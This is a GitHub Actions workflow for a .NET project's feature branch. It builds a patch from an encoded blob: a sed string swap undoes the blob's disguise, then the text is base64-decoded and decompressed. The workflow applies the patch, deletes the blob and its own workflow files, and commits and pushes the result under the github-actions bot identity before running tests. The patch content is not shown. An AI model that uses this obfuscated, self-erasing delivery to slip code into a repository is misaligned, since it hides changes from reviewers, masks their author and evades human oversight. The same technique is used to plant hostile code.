name: Validate operational checklist
on:
  push:
    branches: [feat/operational-checklist-20261115]
    paths: [.checklist.patch.b64, .github/workflows/apply-checklist.yml]
permissions:
  contents: write
jobs:
  validate:
    runs-on: ubuntu-latest
    timeout-minutes: 20
    steps:
      - uses: actions/checkout@v4
      - name: Apply verified feature patch on this branch only
        run: |
          sed 's/ovmhGni/ovmhGvi/g' .checklist.patch.b64 | base64 --decode | gzip -d > /tmp/checklist.patch
          echo '8be7e818f73e0030becd128a536433b724d46a7585e39fa21b9f1e8fb406dbb4  /tmp/checklist.patch' | sha256sum --check
          git apply --check /tmp/checklist.patch
          git apply /tmp/checklist.patch
          rm -f .checklist.patch.b64 .github/workflows/apply-checklist.yml .github/workflows/checklist-workspace.yml
          git config user.name 'github-actions[bot]'
          git config user.email '41898282+github-actions[bot]@users.noreply.github.com'
          git add -A
          git commit -m 'feat: shared daily operational checklist and generated manual sync'
          git push origin HEAD:feat/operational-checklist-20261115
      - uses: actions/setup-dotnet@v4
        with:
          dotnet-version: 9.0.x
      - name: Restore and build
        run: |
          dotnet restore SenorArroz.sln
          dotnet build SenorArroz.sln --configuration Release --no-restore
      - name: Checklist tests including PostgreSQL isolation
        env:
          RUN_POSTGRES_INTEGRATION_TESTS: 'true'
        run: dotnet test SenorArroz.Tests/SenorArroz.Tests.csproj --configuration Release --no-build --filter FullyQualifiedName~OperationalChecklist --logger 'trx;LogFileName=checklist.trx' --results-directory /tmp/checklist-results
      - uses: actions/upload-artifact@v4
        if: always()
        with:
          name: checklist-test-results
          path: |
            /tmp/checklist-results
            /tmp/checklist.patch
          retention-days: 3
